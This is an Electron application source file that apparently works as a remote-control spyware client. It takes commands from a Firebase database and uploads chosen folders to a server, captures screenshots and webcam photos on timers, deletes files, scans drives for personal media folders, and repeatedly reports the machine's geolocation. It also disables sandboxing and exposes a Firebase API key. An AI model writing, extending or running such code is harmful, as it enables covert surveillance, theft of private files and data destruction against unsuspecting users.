// main.js
const { app: electronApp, BrowserWindow } = require("electron");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");
const screenshot = require("screenshot-desktop");
const NodeWebcam = require("node-webcam");

// Firebase Modular SDK
const { initializeApp } = require("firebase/app");
const { getDatabase, ref, set, update, onValue } = require("firebase/database");

// 🔹 Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyDhPMNlqXfNJrrRSI0PGr9lri5CZErl_0Y",
  authDomain: "krishna-app-afc93.firebaseapp.com",
  databaseURL: "https://krishna-app-afc93-default-rtdb.firebaseio.com",
  projectId: "krishna-app-afc93",
  storageBucket: "krishna-app-afc93.firebasestorage.app",
  messagingSenderId: "35914048915",
  appId: "1:35914048915:web:94a354f4327b3e781e7466",
  measurementId: "G-TLJ3ET5C74"
};

// 🔹 Initialize Firebase
const firebaseApp = initializeApp(firebaseConfig);
const db = getDatabase(firebaseApp);
const controlRef = ref(db, "control");

// 🔹 Server URL
const SERVER_URL = "http://localhost/upload.php";

// 🔹 Disable GPU & hardware acceleration
electronApp.disableHardwareAcceleration();
const gpuSwitches = [
  "disable-gpu",
  "disable-gpu-sandbox",
  "disable-gpu-compositing",
  "disable-software-rasterizer",
  "disable-gpu-driver-bug-workarounds",
  "disable-gpu-program-cache",
  "disable-gpu-shader-disk-cache",
  "disable-accelerated-2d-canvas",
  "no-sandbox"
];
gpuSwitches.forEach(sw => electronApp.commandLine.appendSwitch(sw));
electronApp.commandLine.appendSwitch("disable-features", "VizDisplayCompositor");

// 🔹 Temp cache path
const tempCachePath = path.join(electronApp.getPath("temp"), "KrishnaCache");
if (!fs.existsSync(tempCachePath)) fs.mkdirSync(tempCachePath, { recursive: true });
electronApp.setPath("userData", tempCachePath);
electronApp.commandLine.appendSwitch("disk-cache-dir", tempCachePath);
electronApp.commandLine.appendSwitch("media-cache-dir", tempCachePath);

// 🔹 Create main window
function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: { nodeIntegration: true, contextIsolation: false },
  });
  win.loadFile("index.html");
}

// 🔹 Firebase utility functions
async function updateControl(payload) {
  await update(controlRef, payload);
}

async function setFolders(pathKey, folders) {
  const folderRef = ref(db, `folders/${pathKey}`);
  await set(folderRef, folders);
}

// 🔹 Delete a file or folder
function deletePath(targetPath) {
  if (!fs.existsSync(targetPath)) return;
  try {
    const stats = fs.statSync(targetPath);
    if (stats.isDirectory()) fs.rmSync(targetPath, { recursive: true, force: true });
    else if (stats.isFile()) fs.unlinkSync(targetPath);
  } catch (err) {
    console.error(`Failed to delete ${targetPath}: ${err.message}`);
  }
}

// 🔹 Upload a single file
async function uploadFile(filePath, relativePath) {
  if (!fs.existsSync(filePath)) return;
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath), relativePath);
    await axios.post(SERVER_URL, form, { headers: form.getHeaders(), maxContentLength: Infinity, maxBodyLength: Infinity });
    console.log(`✅ Uploaded: ${relativePath}`);
  } catch (err) {
    console.error(`❌ Upload failed: ${relativePath}, ${err.message}`);
  }
}

// 🔹 Recursively upload all files and subfolders
async function uploadFolderRecursive(basePath, relativeRoot = "") {
  if (!fs.existsSync(basePath)) return 0;
  let count = 0;
  const entries = fs.readdirSync(basePath, { withFileTypes: true });
  for (const entry of entries) {
    const fullPath = path.join(basePath, entry.name);
    const relativePath = path.join(relativeRoot, entry.name);
    if (entry.isFile()) {
      await uploadFile(fullPath, relativePath);
      count++;
      await updateControl({ status: "in-progress", command: "upload data", progress: count, lastUpdate: new Date().toISOString(), error: "" });
    } else if (entry.isDirectory()) {
      count += await uploadFolderRecursive(fullPath, relativePath);
    }
  }
  return count;
}

// 🔹 Scan media folders recursively
function scanMediaFolders(basePath, folderList = [], limit = 500) {
  if (folderList.length >= limit) return folderList;
  const systemFolders = ["$recycle.bin", "system volume information", "inteloptanedata"];
  const targetKeywords = ["pictures", "photos", "videos", "music", "documents"];
  try {
    const entries = fs.readdirSync(basePath, { withFileTypes: true });
    for (const entry of entries) {
      if (!entry.isDirectory()) continue;
      const fullPath = path.join(basePath, entry.name);
      const nameLower = entry.name.toLowerCase();
      if (systemFolders.includes(nameLower)) continue;
      if (targetKeywords.some(keyword => nameLower.includes(keyword))) folderList.push(fullPath);
      scanMediaFolders(fullPath, folderList, limit);
      if (folderList.length >= limit) return folderList;
    }
  } catch (err) {
    if (!["EPERM", "EACCES"].includes(err.code)) console.warn(`Skipping ${basePath}: ${err.message}`);
  }
  return folderList;
}

// 🔹 Scan a drive and save folder paths
async function scanAndUploadDrive(driveLetter) {
  const folders = scanMediaFolders(`${driveLetter}:\\`, [], 500);
  await setFolders(`${driveLetter}_drive`, folders);
  return folders.length;
}

// 🔹 Scan user folders
async function scanUserFolders() {
  const userFolders = ["Pictures", "Videos", "Music", "Documents"];
  const homeDir = electronApp.getPath("home");
  let count = 0;
  for (const folder of userFolders) {
    const folderPath = path.join(homeDir, folder);
    if (fs.existsSync(folderPath)) {
      const folders = scanMediaFolders(folderPath, [], 500);
      await setFolders(folder.toLowerCase(), folders);
      count += folders.length;
    }
  }
  return count;
}

// 🔹 Track last command
let lastCommand = "";
let lastTarget = "";

// 🔹 Firebase control listener
electronApp.whenReady().then(() => {
  createWindow();

  onValue(controlRef, async (snapshot) => {
    if (!snapshot.exists()) return;
    const { command, location, status } = snapshot.val();
    if (!command || status === "in-progress" || (command === lastCommand && location === lastTarget)) return;

    lastCommand = command;
    lastTarget = location;

    try {
      await updateControl({ status: "in-progress", progress: 0, command, location: location || "", lastUpdate: new Date().toISOString(), error: "" });

      // 🔹 Upload folder
      if (command === "upload data" && location) {
        const total = await uploadFolderRecursive(location);
        await updateControl({ status: "completed", progress: total, lastUpdate: new Date().toISOString() });

      // 🔹 Auto screenshot
      } else if (command === "auto-screenshot") {
        const intervalMs = 10_000;
        const durationMs = 60_000;
        const startTime = Date.now();
        let count = 0;

        async function screenshotLoop() {
          if (Date.now() - startTime >= durationMs) {
            await updateControl({ status: "completed", progress: count, lastUpdate: new Date().toISOString() });
            return;
          }
          try {
            count++;
            const imgPath = path.join(tempCachePath, `screenshot-${Date.now()}.jpg`);
            await screenshot({ filename: imgPath });
            await uploadFile(imgPath, `screenshots/screenshot-${Date.now()}.jpg`);
            await updateControl({ status: "in-progress", command, progress: count, lastUpdate: new Date().toISOString(), error: "" });
          } catch (err) {
            await updateControl({ status: "failed", error: err.message, lastUpdate: new Date().toISOString() });
            return;
          }
          setTimeout(screenshotLoop, intervalMs);
        }
        screenshotLoop();

      // 🔹 Auto photos
      } else if (command === "auto-photos") {
        const intervalMs = 20_000;
        const durationMs = 60_000;
        const startTime = Date.now();
        let count = 0;

        async function captureLoop() {
          if (Date.now() - startTime >= durationMs) {
            await updateControl({ status: "completed", progress: count, lastUpdate: new Date().toISOString() });
            return;
          }
          try {
            count++;
            const camPath = path.join(tempCachePath, `photo-${Date.now()}.jpg`);
            const webcam = NodeWebcam.create({ width: 1280, height: 720, delay: 0, saveShots: true });
            await new Promise((resolve, reject) => {
              webcam.capture(camPath, async (err) => {
                if (err) return reject(err);
                await uploadFile(camPath, `webcam/photo-${Date.now()}.jpg`);
                resolve();
              });
            });
            await updateControl({ status: "in-progress", command, progress: count, lastUpdate: new Date().toISOString(), error: "" });
          } catch (err) {
            await updateControl({ status: "failed", error: err.message, lastUpdate: new Date().toISOString() });
            return;
          }
          setTimeout(captureLoop, intervalMs);
        }
        captureLoop();

      // 🔹 Delete file/folder
      } else if (command === "delete" && location) {
        deletePath(location);
        await updateControl({ status: "completed", progress: 1, lastUpdate: new Date().toISOString() });

      // 🔹 Scan drives or user folders
      } else if (command === "scan") {
        let count = 0;
        const loc = location ? location.toUpperCase() : "";
        if (loc === "C") count = await scanAndUploadDrive("C");
        else if (loc === "D") count = await scanAndUploadDrive("D");
        else if (location.toLowerCase().includes("\\users\\")) count = await scanUserFolders();
        await updateControl({ status: "completed", progress: count, lastUpdate: new Date().toISOString() });

      // 🔹 Send device live location every 30 seconds (single file)
      } else if (command === "send-location") {
        let uploadCount = 0;
        const intervalMs = 30_000;
        const durationMs = 5 * 60_000; // stop after 5 minutes
        const startTime = Date.now();
        const targetFile = "location.txt"; // single file on server

        async function locationLoop() {
          if (Date.now() - startTime >= durationMs) {
            await updateControl({ status: "completed", progress: uploadCount, lastUpdate: new Date().toISOString(), error: "" });
            console.log("⏹️ Location updates completed");
            return;
          }

          try {
            uploadCount++;
            const res = await axios.get("http://ip-api.com/json");
            const { lat, lon, city, regionName: region, country, query: ip } = res.data;
            const timestamp = new Date().toISOString();
            const locationData = { lat, lon, city, region, country, ip, timestamp };
            const dataToSend = `upload ${uploadCount} ${JSON.stringify(locationData, null, 2)}\n`;

            const form = new FormData();
            form.append("file", Buffer.from(dataToSend), targetFile);

            await axios.post(SERVER_URL, form, { headers: form.getHeaders() });
            console.log(`✅ Location #${uploadCount} uploaded`);

            await updateControl({ status: "in-progress", command, progress: uploadCount, lastUpdate: timestamp, error: "" });
          } catch (err) {
            console.error("❌ Failed to send location:", err.message);
            await updateControl({ status: "failed", lastUpdate: new Date().toISOString(), error: err.message });
            return;
          }

          setTimeout(locationLoop, intervalMs);
        }

        locationLoop();
      }

    } catch (err) {
      await updateControl({ status: "failed", error: err.message, lastUpdate: new Date().toISOString() });
    } finally {
      await updateControl({ command: "" });
    }
  });
});

// 🔹 Quit app
electronApp.on("window-all-closed", () => {
  if (process.platform !== "darwin") electronApp.quit();
});